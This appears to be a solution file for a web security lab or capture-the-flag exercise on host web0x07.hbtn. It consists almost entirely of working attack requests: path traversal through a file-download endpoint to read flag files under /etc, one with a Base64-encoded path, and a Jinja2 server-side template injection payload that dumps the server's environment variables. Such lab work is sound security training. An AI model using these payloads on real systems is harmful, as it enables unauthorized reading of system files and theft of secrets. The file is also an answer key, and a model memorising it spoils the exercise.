0 GET /task0/download_file?filename=0-flag.txt&path=/etc HTTP/1.1
1 GET /task1/download_file?filename=1-flag.txt&path=..//etc HTTP/1.1
2 GET /task2/download_file?filename=&path=L2V0Yy8yLWZsYWcudHh0 HTTP/1.1 (This is /etc/2-flag.txt encoded in Base64)
3 GET /task3/create_rapport HTTP (this will show you the form)
GET /task3/list_file HTTP/1.1
GET /task3/view_file?filename=RAPPORT_13-25_1743254710_29-03-2025.html HTTP/1.1

POST /task3/create_rapport HTTP/1.1
Host: web0x07.hbtn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://web0x07.hbtn/task3/list_file
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: [appropriate length]

rapport={{ config.__class__.__init__.__globals__['os'].environ }}

